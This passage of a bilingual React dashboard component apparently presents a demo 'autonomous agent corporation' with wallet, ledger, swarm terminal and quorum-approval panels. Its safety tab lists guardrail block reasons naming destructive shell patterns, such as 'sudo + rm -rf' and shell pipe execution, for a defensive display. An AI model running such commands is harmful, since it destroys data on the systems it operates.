        display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap', gap: '16px',
      }}>
        <div>
          <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '6px' }}>
            <span style={{ fontSize: '1.8rem' }}>⚡</span>
            <h2 style={{ margin: 0, fontSize: '1.6rem', fontWeight: 900, letterSpacing: '-0.02em' }}>
              GoalChain Autopilot Corp
            </h2>
          </div>
          <p style={{ margin: 0, fontSize: '0.85rem', color: '#94a3b8', maxWidth: 520 }}>
            {language === 'es' ? (
              <>
                Una <strong style={{ color: '#9945ff' }}>Corporación de Agentes Autónomos</strong> auto-sostenible impulsada por{' '}
                <strong style={{ color: '#76b900' }}>NVIDIA Nemotron 3</strong>,{' '}
                <strong style={{ color: '#14f195' }}>Stripe Skills</strong> y{' '}
                <strong style={{ color: '#00e0ff' }}>medidas de seguridad de NemoClaw</strong>.
                Los agentes ganan, gastan y se gobiernan por sí mismos.
              </>
            ) : (
              <>
                A self-sustaining <strong style={{ color: '#9945ff' }}>Autonomous Agent Corporation</strong> powered by{' '}
                <strong style={{ color: '#76b900' }}>NVIDIA Nemotron 3</strong>,{' '}
                <strong style={{ color: '#14f195' }}>Stripe Skills</strong>, and{' '}
                <strong style={{ color: '#00e0ff' }}>NemoClaw safety guardrails</strong>.
                The agents earn, spend, and govern themselves.
              </>
            )}
          </p>
        </div>
        <div style={{ display: 'flex', gap: '8px', flexWrap: 'wrap' }}>
          <Badge label={tText('NEMOCLAW: ACTIVE', 'NEMOCLAW: ACTIVO')}     color="#14f195" />
          <Badge label={tText('STRIPE: LIVE', 'STRIPE: ACTIVO')}          color="#9945ff" />
          <Badge label={tText('NVIDIA NIM: CONNECTED', 'NVIDIA NIM: CONECTADO')} color="#76b900" />
          <Badge label={activeScenario ? tText('● RUNNING', '● EN EJECUCIÓN') : tText('◉ IDLE', '◉ INACTIVO')} color={activeScenario ? '#ef4444' : '#64748b'} />
        </div>
      </div>

      {/* ── ECONOMY FLOW DIAGRAM ── */}
      <div style={{
        background: 'rgba(10,10,22,0.7)', border: '1px solid rgba(251,191,36,0.2)',
        borderRadius: '14px', padding: '16px 20px', backdropFilter: 'blur(10px)',
      }}>
        <div style={{ fontSize: '0.75rem', color: '#fbbf24', fontWeight: 700, marginBottom: '12px', textTransform: 'uppercase', letterSpacing: '0.07em' }}>
          {tText(
            '⚙️ Economic Flywheel — NFT Revenue → 10% → Agent Wallet → Self-Sustaining Operations',
            '⚙️ Volante Económico — Ingresos de NFT → 10% → Monedero de Agente → Operaciones Auto-Sostenibles'
          )}
        </div>
        <EconomyDiagram highlighted={economyPulse} />
      </div>

      {/* ── KPI ROW ── */}
      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(150px, 1fr))', gap: '12px' }}>
        <StatCard label={tText('Corporate Balance', 'Balance Corporativo')}    value={`$${fmt(balance.available)}`}              color="#14f195" sub={tText('Stripe available', 'Stripe disponible')} />
        <StatCard label={tText('Agent Wallet', 'Monedero del Agente')}          value={`$${fmt(agentWallet.balance_usd)}`}         color="#9945ff" sub={tText('Self-funded from NFTs', 'Autofinanciado por NFTs')} />
        <StatCard label={tText('Total Funded (Agents)', 'Fondo Total (Agentes)')} value={`$${fmt(agentWallet.total_funded_usd)}`}    color="#fbbf24" sub={tText('Lifetime NFT 10% cut', 'Histórico de 10% de NFTs')} />
        <StatCard label={tText('Total Spent (Agents)', 'Total Gastado (Agentes)')}  value={`$${fmt(agentWallet.total_spent_usd)}`}     color="#f87171" sub={tText('Ops + NVIDIA + payouts', 'Ops + NVIDIA + pagos')} />
        <StatCard label={tText('Wallet Utilization', 'Uso del Monedero')}    value={`${walletUtilPct}%`}                        color="#00e0ff" sub={tText('Efficiency ratio', 'Ratio de eficiencia')} />
        <StatCard label={tText('Commands Blocked', 'Comandos Bloqueados')}      value={`${blockedCount} / ${safeCount + blockedCount}`} color="#ef4444" sub={tText('NemoClaw protection', 'Protección NemoClaw')} />
      </div>

      {/* ── SCENARIO CONSOLE ── */}
      <section style={{
        background: 'rgba(10,10,22,0.6)', border: '1px solid rgba(255,255,255,0.07)',
        borderRadius: '14px', padding: '20px', backdropFilter: 'blur(10px)',
      }}>
        <h3 style={{ margin: '0 0 14px 0', fontSize: '0.9rem', fontWeight: 800, color: 'rgba(255,255,255,0.6)', textTransform: 'uppercase', letterSpacing: '0.07em' }}>
          {tText(
            '🎮 Live Simulation Console — Trigger a Real Business Event',
            '🎮 Consola de Simulación en Vivo — Activar un Evento Empresarial Real'
          )}
        </h3>
        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))', gap: '10px' }}>
          {Object.entries(SCENARIOS).map(([id, s]) => {
            const isActive = activeScenario === id;
            const isDisabled = !!activeScenario && !isActive;
            return (
              <button key={id} onClick={() => runScenario(id)} disabled={!!activeScenario} style={{
                padding: '14px', borderRadius: '10px', cursor: isDisabled ? 'not-allowed' : 'pointer',
                background: isActive ? `${s.color}22` : 'rgba(255,255,255,0.02)',
                border: `1px solid ${isActive ? s.color : 'rgba(255,255,255,0.08)'}`,
                color: '#fff', textAlign: 'left', display: 'flex', flexDirection: 'column', gap: '5px',
                opacity: isDisabled ? 0.35 : 1, transition: 'all 0.2s ease',
                boxShadow: isActive ? `0 0 16px ${s.color}44` : 'none',
              }}>
                <span style={{ fontSize: '1.1rem' }}>{s.icon}</span>
                <span style={{ fontSize: '0.82rem', fontWeight: 800, color: isActive ? s.color : '#e2e8f0' }}>
                  {language === 'es' ? s.labelEs : s.labelEn}
                </span>
                <span style={{ fontSize: '0.62rem', color: '#64748b' }}>
                  {language === 'es' ? s.subEs : s.subEn}
                </span>
              </button>
            );
          })}
        </div>
      </section>

      {/* ── MAIN GRID: SWARM + TERMINAL ── */}
      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(340px, 1fr))', gap: '1.5rem' }}>

        {/* SWARM TOPOLOGY */}
        <section style={{
          background: 'rgba(10,10,22,0.7)', border: '1px solid rgba(153,69,255,0.2)',
          borderRadius: '14px', padding: '20px', backdropFilter: 'blur(10px)',
          display: 'flex', flexDirection: 'column', gap: '12px',
        }}>
          <h3 style={{ margin: 0, fontSize: '1rem', fontWeight: 800, borderBottom: '1px solid rgba(255,255,255,0.06)', paddingBottom: '10px' }}>
            {tText('🤖 NVIDIA Nemotron — LangGraph Swarm', '🤖 NVIDIA Nemotron — Enjambre LangGraph')}
          </h3>
          <SwarmTopology nodes={swarmNodes} />
          <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '8px' }}>
            <div style={{ background: 'rgba(255,255,255,0.02)', padding: '10px', borderRadius: '8px', border: '1px solid rgba(255,255,255,0.05)' }}>
              <div style={{ fontSize: '0.6rem', color: '#94a3b8', fontWeight: 700 }}>{tText('MODEL ENGINE', 'MOTOR DEL MODELO')}</div>
              <div style={{ fontSize: '0.7rem', fontWeight: 700, color: '#76b900', marginTop: '2px' }}>nvidia/nemotron-3-super-120b</div>
            </div>
            <div style={{ background: 'rgba(255,255,255,0.02)', padding: '10px', borderRadius: '8px', border: '1px solid rgba(255,255,255,0.05)' }}>
              <div style={{ fontSize: '0.6rem', color: '#94a3b8', fontWeight: 700 }}>{tText('ROUTING HOPS', 'SALTOS DE ENRUTAMIENTO')}</div>
              <div style={{ fontSize: '0.7rem', fontWeight: 700, color: swarmHops > 0 ? '#9945ff' : '#475569', marginTop: '2px' }}>{swarmHops} / 6 MAX</div>
            </div>
            <div style={{ background: 'rgba(255,255,255,0.02)', padding: '10px', borderRadius: '8px', border: '1px solid rgba(255,255,255,0.05)' }}>
              <div style={{ fontSize: '0.6rem', color: '#94a3b8', fontWeight: 700 }}>{tText('SAFETY LAYER', 'CAPA DE SEGURIDAD')}</div>
              <div style={{ fontSize: '0.7rem', fontWeight: 700, color: '#14f195', marginTop: '2px' }}>{tText('NemoClaw: ACTIVE', 'NemoClaw: ACTIVA')}</div>
            </div>
            <div style={{ background: 'rgba(255,255,255,0.02)', padding: '10px', borderRadius: '8px', border: '1px solid rgba(255,255,255,0.05)' }}>
              <div style={{ fontSize: '0.6rem', color: '#94a3b8', fontWeight: 700 }}>{tText('SWARM STATUS', 'ESTADO DEL ENJAMBRE')}</div>
              <div style={{ fontSize: '0.7rem', fontWeight: 700, color: activeScenario ? '#fbbf24' : '#475569', marginTop: '2px' }}>
                ● {activeScenario ? tText('RUNNING', 'EJECUTANDO') : tText('IDLE', 'INACTIVO')}
              </div>
            </div>
          </div>
        </section>

        {/* LIVE TERMINAL */}
        <section style={{
          background: 'rgba(4,4,9,0.97)', border: '1px solid rgba(20,241,149,0.2)',
          borderRadius: '14px', padding: '20px', backdropFilter: 'blur(10px)',
          display: 'flex', flexDirection: 'column', gap: '12px',
        }}>
          <h3 style={{ margin: 0, fontSize: '1rem', fontWeight: 800, color: '#14f195', borderBottom: '1px solid rgba(20,241,149,0.12)', paddingBottom: '10px', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
            <span>{tText('📟 Live Swarm Terminal', '📟 Terminal del Enjambre en Vivo')}</span>
            {activeScenario && (
              <span style={{ display: 'flex', alignItems: 'center', gap: '6px', fontSize: '0.65rem', color: '#ef4444', fontWeight: 800 }}>
                <span style={{ width: 7, height: 7, borderRadius: '50%', background: '#ef4444', display: 'inline-block', animation: 'pulse 1s infinite' }} />
                {tText('RUNNING', 'EJECUTANDO')}
              </span>
            )}
          </h3>
          <div style={{
            flex: 1, overflowY: 'auto', maxHeight: '320px',
            display: 'flex', flexDirection: 'column', gap: '4px',
            fontFamily: "'JetBrains Mono', 'Fira Code', monospace", fontSize: '0.72rem', lineHeight: 1.5,
            background: 'rgba(0,0,0,0.5)', padding: '12px', borderRadius: '10px',
            border: '1px solid rgba(20,241,149,0.08)',
          }}>
            {terminalLogs.map((log, idx) => (
              <div key={idx} style={{
                whiteSpace: 'pre-wrap',
                color: log.includes('[NemoClaw]') && log.includes('BLOCK') ? '#ef4444' :
                       log.includes('✅') || log.includes('SUCCESS') || log.includes('NOMINAL') ? '#14f195' :
                       log.includes('🚀') ? '#fbbf24' :
                       log.includes('[Stripe]') ? '#9945ff' :
                       log.includes('[NVIDIA]') || log.includes('NIM') ? '#76b900' :
                       '#94a3b8',
              }}>{log}</div>
            ))}
            <div ref={terminalEndRef} />
          </div>
        </section>
      </div>

      {/* ── BOTTOM GRID: DATA PANELS ── */}
      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(340px, 1fr))', gap: '1.5rem' }}>

        {/* TABBED DATA PANEL */}
        <section style={{
          background: 'rgba(10,10,22,0.7)', border: '1px solid rgba(255,255,255,0.07)',
          borderRadius: '14px', padding: '20px', backdropFilter: 'blur(10px)',
          display: 'flex', flexDirection: 'column', gap: '12px',
        }}>
          {/* Tab bar */}
          <div style={{ display: 'flex', gap: '8px', borderBottom: '1px solid rgba(255,255,255,0.06)', paddingBottom: '12px' }}>
            {([['wallet', tText('💳 Agent Wallet', '💳 Monedero Agente')], ['ledger', tText('📊 Corp Ledger', '📊 Libro Corp')], ['safety', tText('🛡️ NemoClaw', '🛡️ NemoClaw')]] as const).map(([tab, label]) => (
              <button key={tab} onClick={() => setActiveTab(tab)} style={{
                padding: '6px 14px', borderRadius: '8px', fontSize: '0.72rem', fontWeight: 700, cursor: 'pointer',
                background: activeTab === tab ? 'rgba(153,69,255,0.2)' : 'transparent',
                border: `1px solid ${activeTab === tab ? '#9945ff' : 'transparent'}`,
                color: activeTab === tab ? '#9945ff' : '#64748b', transition: 'all 0.2s',
              }}>{label}</button>
            ))}
          </div>

          {/* AGENT WALLET TAB */}
          {activeTab === 'wallet' && (
            <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
              {/* Wallet balance bar */}
              <div>
                <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '6px' }}>
                  <span style={{ fontSize: '0.68rem', color: '#94a3b8', fontWeight: 700 }}>{tText('WALLET UTILIZATION', 'UTILIZACIÓN DEL MONEDERO')}</span>
                  <span style={{ fontSize: '0.68rem', color: '#9945ff', fontWeight: 800 }}>{walletUtilPct}%</span>
                </div>
                <div style={{ height: 6, borderRadius: 4, background: 'rgba(255,255,255,0.06)', overflow: 'hidden' }}>
                  <div style={{ height: '100%', width: `${walletUtilPct}%`, background: 'linear-gradient(90deg, #9945ff, #14f195)', borderRadius: 4, transition: 'width 1s ease' }} />
                </div>
              </div>

              {/* Funding events */}
              <div>
                <div style={{ fontSize: '0.65rem', color: '#94a3b8', fontWeight: 700, marginBottom: '8px' }}>{tText('INCOMING — NFT 10% FUNDING', 'ENTRANTE — 10% FINANCIACIÓN NFT')}</div>
                <div style={{ display: 'flex', flexDirection: 'column', gap: '6px', maxHeight: '140px', overflowY: 'auto' }}>
                  {agentWallet.funding_events.map(ev => {
                    const translatedSource = ev.source
                      .replace('NFT Sale — Genesis Pack', tText('NFT Sale — Genesis Pack', 'Venta de NFT — Sobre Genesis'))
                      .replace('NFT Sale — Dynamic Pack', tText('NFT Sale — Dynamic Pack', 'Venta de NFT — Sobre Dinámico'))
                      .replace('Elite Subscription', tText('Elite Subscription', 'Suscripción Elite'));
                    return (
                      <div key={ev.id} style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', background: 'rgba(20,241,149,0.04)', border: '1px solid rgba(20,241,149,0.08)', borderRadius: '8px', padding: '6px 10px', fontSize: '0.7rem' }}>
                        <div>
                          <div style={{ fontWeight: 700, color: '#e2e8f0' }}>{translatedSource}</div>
                          <div style={{ fontSize: '0.58rem', color: '#64748b' }}>{fmtDate(ev.ts, language)} · {ev.pct} {tText('cut', 'comisión')}</div>
                        </div>
                        <span style={{ fontWeight: 800, color: '#14f195' }}>+${ev.amount_usd.toFixed(2)}</span>
                      </div>
                    );
                  })}
                </div>
              </div>

              {/* Spend events */}
              <div>
                <div style={{ fontSize: '0.65rem', color: '#94a3b8', fontWeight: 700, marginBottom: '8px' }}>{tText('OUTGOING — AGENT SPENDING', 'SALIENTE — GASTOS DEL AGENTE')}</div>
                <div style={{ display: 'flex', flexDirection: 'column', gap: '6px', maxHeight: '140px', overflowY: 'auto' }}>
                  {agentWallet.spend_events.map(ev => {
                    const translatedService = ev.service
                      .replace('Helius Solana RPC Credits', tText('Helius Solana RPC Credits', 'Créditos RPC Helius Solana'))
                      .replace('FAL.ai Image Gen Credits', tText('FAL.ai Image Gen Credits', 'Créditos de Imagen FAL.ai'))
                      .replace('Render.com Hosting Invoice', tText('Render.com Hosting Invoice', 'Factura de Alojamiento Render.com'))
                      .replace('Contributor Payout', tText('Contributor Payout', 'Pago a Colaborador'))
                      .replace('NVIDIA NIM API Compute', tText('NVIDIA NIM API Compute', 'Cómputo de API NVIDIA NIM'));
                    return (
                      <div key={ev.id} style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', background: 'rgba(239,68,68,0.04)', border: '1px solid rgba(239,68,68,0.08)', borderRadius: '8px', padding: '6px 10px', fontSize: '0.7rem' }}>
                        <div>
                          <div style={{ fontWeight: 700, color: '#e2e8f0' }}>{translatedService}</div>
                          <div style={{ fontSize: '0.58rem', color: '#64748b' }}>{fmtDate(ev.ts, language)} · {ev.auto ? tText('🤖 Auto', '🤖 Auto') : tText('👤 Manual', '👤 Manual')}</div>
                        </div>
                        <span style={{ fontWeight: 800, color: '#f87171' }}>-${ev.amount_usd.toFixed(2)}</span>
                      </div>
                    );
                  })}
                </div>
              </div>
            </div>
          )}

          {/* CORP LEDGER TAB */}
          {activeTab === 'ledger' && (
            <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '8px' }}>
                <div style={{ background: 'rgba(20,241,149,0.06)', padding: '12px', borderRadius: '10px', border: '1px solid rgba(20,241,149,0.12)' }}>
                  <div style={{ fontSize: '0.6rem', color: '#94a3b8', fontWeight: 700 }}>{tText('AVAILABLE', 'DISPONIBLE')}</div>
                  <div style={{ fontSize: '1.3rem', fontWeight: 800, color: '#14f195', marginTop: '3px' }}>${fmt(balance.available)}</div>
                  <div style={{ fontSize: '0.6rem', color: '#64748b' }}>USD</div>
                </div>
                <div style={{ background: 'rgba(255,255,255,0.03)', padding: '12px', borderRadius: '10px', border: '1px solid rgba(255,255,255,0.06)' }}>
                  <div style={{ fontSize: '0.6rem', color: '#94a3b8', fontWeight: 700 }}>{tText('PENDING', 'PENDIENTE')}</div>
                  <div style={{ fontSize: '1.3rem', fontWeight: 800, color: '#e2e8f0', marginTop: '3px' }}>${fmt(balance.pending)}</div>
                  <div style={{ fontSize: '0.6rem', color: '#64748b' }}>USD</div>
                </div>
              </div>
              <div style={{ display: 'flex', gap: '8px' }}>
                <button onClick={() => handleCheckout('subscription')} disabled={loadingCheckout} style={{ flex: 1, padding: '10px', borderRadius: '8px', fontSize: '0.75rem', fontWeight: 800, background: '#9945ff', color: '#fff', border: 'none', cursor: 'pointer' }}>
                  {tText('Elite Subscription ($19/mo)', 'Suscripción Elite ($19/mes)')}
                </button>
                <button onClick={() => handleCheckout('pack')} disabled={loadingCheckout} style={{ flex: 1, padding: '10px', borderRadius: '8px', fontSize: '0.75rem', fontWeight: 800, background: 'rgba(20,241,149,0.1)', color: '#14f195', border: '1px solid #14f195', cursor: 'pointer' }}>
                  {tText('Player Pack ($9.99)', 'Sobre de Jugador ($9.99)')}
                </button>
              </div>
              <div style={{ display: 'flex', flexDirection: 'column', gap: '6px', maxHeight: '220px', overflowY: 'auto' }}>
                {ledger.map(item => {
                  const translateDescription = (desc: string) => {
                    if (language !== 'es') return desc;
                    const translations: Record<string, string> = {
                      'Manager Elite Subscription — Upgrade': 'Suscripción Manager Elite — Mejora',
                      'Helius Solana RPC Credit Recharge': 'Recarga de Créditos Helius Solana RPC',
                      'Genesis Pack #48 Purchase': 'Compra de Sobre Genesis #48',
                      'FAL.ai Image Model Generation Credits': 'Créditos de Generación de Modelos FAL.ai',
                      'Domain Purchase: play-goalchain.com': 'Compra de Dominio: play-goalchain.com',
                      'Helius RPC Credits (Agent Auto-Recharge)': 'Créditos RPC Helius (Auto-recarga de Agente)',
                      'Contributor Payout @NicoPez — Issue #834': 'Pago a colaborador @NicoPez — Incidencia #834',
                      'Genesis Pack #212 Sale': 'Venta de Sobre Genesis #212',
                      'Render.com Hosting (Squad-Authorized)': 'Alojamiento Render.com (Autorizado por Plantilla)',
                    };
                    if (desc.includes('Genesis Pack') && desc.includes('Sale')) {
                      return desc.replace('Genesis Pack', 'Sobre Genesis').replace('Sale', 'Venta');
                    }
                    if (desc.includes('Contributor Payout')) {
                      return desc.replace('Contributor Payout', 'Pago a colaborador');
                    }
                    return translations[desc] || desc;
                  };
                  return (
                    <div key={item.id} style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', background: 'rgba(255,255,255,0.02)', padding: '8px 12px', borderRadius: '8px', fontSize: '0.73rem' }}>
                      <div>
                        <div style={{ fontWeight: 700 }}>{translateDescription(item.description)}</div>
                        <div style={{ fontSize: '0.6rem', color: '#64748b', marginTop: '2px' }}>{fmtDate(item.timestamp, language)}</div>
                      </div>
                      <span style={{ fontWeight: 800, color: item.type === 'income' ? '#14f195' : '#f87171' }}>
                        {item.type === 'income' ? '+' : '-'}${item.amount.toFixed(2)}
                      </span>
                    </div>
                  );
                })}
              </div>
            </div>
          )}

          {/* NEMOCLAW TAB */}
          {activeTab === 'safety' && (
            <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '8px' }}>
                <div style={{ background: 'rgba(20,241,149,0.06)', padding: '12px', borderRadius: '10px', border: '1px solid rgba(20,241,149,0.15)', textAlign: 'center' }}>
                  <div style={{ fontSize: '0.6rem', color: '#94a3b8', fontWeight: 700 }}>{tText('COMMANDS PASSED', 'COMANDOS APROBADOS')}</div>
                  <div style={{ fontSize: '1.8rem', fontWeight: 800, color: '#14f195' }}>{safeCount}</div>
                </div>
                <div style={{ background: 'rgba(239,68,68,0.06)', padding: '12px', borderRadius: '10px', border: '1px solid rgba(239,68,68,0.15)', textAlign: 'center' }}>
                  <div style={{ fontSize: '0.6rem', color: '#94a3b8', fontWeight: 700 }}>{tText('COMMANDS BLOCKED', 'COMANDOS BLOQUEADOS')}</div>
                  <div style={{ fontSize: '1.8rem', fontWeight: 800, color: '#ef4444' }}>{blockedCount}</div>
                </div>
              </div>
              <div style={{ display: 'flex', flexDirection: 'column', gap: '6px', maxHeight: '280px', overflowY: 'auto' }}>
                {safetyLogs.map(log => {
                  const translateReason = (reason: string) => {
                    if (language !== 'es') return reason;
                    const trans: Record<string, string> = {
                      'Approved: Read-only system check': 'Aprobado: Verificación de sistema de solo lectura',
                      'Blocked by NemoClaw: Dangerous pattern detected.': 'Bloqueado por NemoClaw: Patrón peligroso detectado.',
                      'Approved: Safe GitHub API query': 'Aprobado: Consulta segura de API de GitHub',
                      'Blocked by NemoClaw: Shell pipe execution forbidden.': 'Bloqueado por NemoClaw: Ejecución de tubería de shell prohibida.',
                      'Blocked by NemoClaw: sudo + rm -rf detected.': 'Bloqueado por NemoClaw: se detectó sudo + rm -rf.',
                    };
                    return trans[reason] || reason;
                  };
                  return (
                    <div key={log.id} style={{
                      background: 'rgba(255,255,255,0.02)',
                      border: `1px solid ${log.status === 'safe' ? 'rgba(20,241,149,0.15)' : 'rgba(239,68,68,0.25)'}`,
                      borderRadius: '8px', padding: '8px 10px', fontSize: '0.72rem',
                    }}>
                      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '3px' }}>
                        <code style={{ color: '#cbd5e1', fontWeight: 700, fontFamily: 'monospace' }}>$ {log.command.slice(0, 48)}{log.command.length > 48 ? '...' : ''}</code>
                        <span style={{
                          fontSize: '0.55rem', fontWeight: 800, padding: '2px 6px', borderRadius: '4px',
                          background: log.status === 'safe' ? 'rgba(20,241,149,0.15)' : 'rgba(239,68,68,0.15)',
                          color: log.status === 'safe' ? '#14f195' : '#ef4444',
                        }}>{log.status.toUpperCase()}</span>
                      </div>
                      <div style={{ fontSize: '0.63rem', color: log.status === 'safe' ? '#94a3b8' : '#fca5a5' }}>{translateReason(log.reason)}</div>
                      <div style={{ fontSize: '0.58rem', color: '#475569', marginTop: '2px' }}>{fmtDate(log.timestamp, language)}</div>
                    </div>
                  );
                })}
              </div>
            </div>
          )}
        </section>

        {/* ARCHITECTURE EXPLAINER */}
        <section style={{
          background: 'rgba(10,10,22,0.7)', border: '1px solid rgba(0,224,255,0.15)',
          borderRadius: '14px', padding: '20px', backdropFilter: 'blur(10px)',
          display: 'flex', flexDirection: 'column', gap: '14px',
        }}>
          <h3 style={{ margin: 0, fontSize: '1rem', fontWeight: 800, borderBottom: '1px solid rgba(255,255,255,0.06)', paddingBottom: '10px', color: '#00e0ff' }}>
            {tText('🏗️ GC-AAC Architecture', '🏗️ Arquitectura GC-AAC')}
          </h3>

          {[
            { labelEn: 'Hermes CEO', labelEs: 'Hermes CEO', descEn: 'Discord/WA interface — routes objectives via LangGraph swarm', descEs: 'Interfaz de Discord/WA — enruta objetivos a través de enjambre LangGraph', color: '#9945ff', icon: '👑' },
            { labelEn: 'NVIDIA Nemotron 3', labelEs: 'NVIDIA Nemotron 3', descEn: 'Powers all agent reasoning via NVIDIA NIM API (nemotron-3-super-120b)', descEs: 'Impulsa todo el razonamiento del agente a través de la API de NVIDIA NIM (nemotron-3-super-120b)', color: '#76b900', icon: '🧠' },
            { labelEn: 'NemoClaw Guards', labelEs: 'Guardias NemoClaw', descEn: 'Two-layer safety: regex + LLM audit on every shell command & prompt', descEs: 'Seguridad en dos capas: expresiones regulares + auditoría de LLM en cada comando de shell y prompt', color: '#14f195', icon: '🛡️' },
            { labelEn: 'Stripe Skills', labelEs: 'Stripe Skills', descEn: 'Agents earn (checkout), spend (SaaS), and pay contributors autonomously', descEs: 'Los agentes ganan (pago), gastan (SaaS) y pagan a colaboradores de forma autónoma', color: '#9945ff', icon: '💳' },
            { labelEn: 'Agent Wallet', labelEs: 'Monedero del Agente', descEn: '10% of every NFT/pack sale auto-routes to fund agent operations perpetually', descEs: 'El 10% de cada venta de sobre/NFT se redirige automáticamente para financiar operaciones de agentes de por vida', color: '#fbbf24', icon: '⚽' },
            { labelEn: 'LangGraph Swarm', labelEs: 'Enjambre LangGraph', descEn: 'CEO → Dev/Growth/Ops → CEO multi-hop graph with max 6 routing hops', descEs: 'CEO → Dev/Growth/Ops → CEO grafo multisalto con un máximo de 6 saltos de enrutamiento', color: '#00e0ff', icon: '🔀' },
            { labelEn: 'Oracle Cloud VPS', labelEs: 'VPS Oracle Cloud', descEn: 'Production server running FastAPI + Python multi-agent engine in systemd', descEs: 'Servidor de producción que ejecuta el motor multiagente FastAPI + Python en systemd', color: '#ef4444', icon: '🖥️' },
          ].map(item => (
            <div key={item.labelEn} style={{
              display: 'flex', gap: '12px', alignItems: 'flex-start',
              background: 'rgba(255,255,255,0.02)', padding: '10px 12px', borderRadius: '10px',
              border: `1px solid ${item.color}22`,
            }}>
              <span style={{ fontSize: '1rem', flexShrink: 0 }}>{item.icon}</span>
              <div>
                <div style={{ fontSize: '0.75rem', fontWeight: 800, color: item.color }}>{language === 'es' ? item.labelEs : item.labelEn}</div>
                <div style={{ fontSize: '0.67rem', color: '#64748b', marginTop: '2px', lineHeight: 1.4 }}>{language === 'es' ? item.descEs : item.descEn}</div>
              </div>
            </div>
          ))}
        </section>
      </div>

      {/* ── PLAYER QUORUM PANEL (appears when HIGH/CRITICAL scenario runs) ── */}
      {showQuorumPanel && (
        <section style={{
          background: 'rgba(10,10,22,0.97)',
          border: '1px solid rgba(249,115,22,0.35)',
          borderRadius: '18px', padding: '24px',
          backdropFilter: 'blur(20px)',
          boxShadow: '0 0 60px rgba(249,115,22,0.15)',
        }}>
          <div style={{
            display: 'flex', alignItems: 'center', gap: '10px', marginBottom: '16px',
            paddingBottom: '14px', borderBottom: '1px solid rgba(249,115,22,0.2)',
          }}>
            <span style={{ fontSize: '1.2rem' }}>⚖️</span>
            <div>
              <div style={{ fontSize: '0.72rem', color: '#f97316', fontWeight: 800, textTransform: 'uppercase', letterSpacing: '0.08em' }}>
                {tText('NemoClaw — Quorum Required', 'NemoClaw — Cuórum Requerido')}
              </div>
              <div style={{ fontSize: '0.68rem', color: '#64748b', marginTop: '2px' }}>
                {tText('Agent swarm is waiting for Genesis Squad authorization to proceed.', 'El enjambre de agentes está esperando la autorización de la Plantilla Genesis para proceder.')}
              </div>
            </div>
          </div>

          <PlayerQuorumPanel
            initialOperation={quorumOperation}
            onQuorumReached={(result) => {
              const signers = result.squad_players.map((p: { name: string }) => p.name).join(', ');
              addLog(tText(
                `[Quorum] ✅ AUTHORIZED by ${result.squad_players.length} signers: ${signers} (${result.squad_gp.toFixed(1)} GP)`,
                `[Cuórum] ✅ AUTORIZADO por ${result.squad_players.length} firmantes: ${signers} (${result.squad_gp.toFixed(1)} GP)`
              ));
              setTimeout(() => {
                addLog(tText(
                  '[CEO] Quorum confirmed. Stripe payment $200 authorized by squad.',
                  '[CEO] Cuórum confirmado. Pago de Stripe de $200 autorizado por la plantilla.'
                ));
                setNodeStatus('CEO', 'thinking');
                setSwarmHops(2);
              }, 500);
              setTimeout(() => addLog(tText(
                '[Stripe] Processing: $200 payment for Render.com hosting...',
                '[Stripe] Procesando: pago de $200 para alojamiento Render.com...'
              )), 1800);
              setTimeout(() => {
                addLog(tText(
                  '[Stripe] ✅ SUCCESS: $200 paid. Render.com hosting renewed 30 days.',
                  '[Stripe] ✅ ÉXITO: $200 pagados. Alojamiento Render.com renovado por 30 días.'
                ));
                setAgentWallet((p: typeof agentWallet) => ({
                  ...p,
                  balance_usd: +(p.balance_usd - 200).toFixed(2),
                  total_spent_usd: +(p.total_spent_usd + 200).toFixed(2),
                  spend_events: [{ id: `s_${Date.now()}`, ts: new Date().toISOString(), service: language === 'es' ? 'Alojamiento Render.com (Autorizado por Plantilla)' : 'Render.com Hosting (Squad-Authorized)', amount_usd: 200, auto: false }, ...p.spend_events],
                }));
                setNodeStatus('CEO', 'idle');
                setSwarmHops(0);
                setShowQuorumPanel(false);
              }, 3200);
            }}
            onDismiss={() => {
              setShowQuorumPanel(false);
              addLog(tText(
                '[System] Quorum panel dismissed. Operation cancelled by manager.',
                '[Sistema] Panel de cuórum descartado. Operación cancelada por el mánager.'
              ));
            }}
          />
        </section>
      )}

    </div>
  );
}
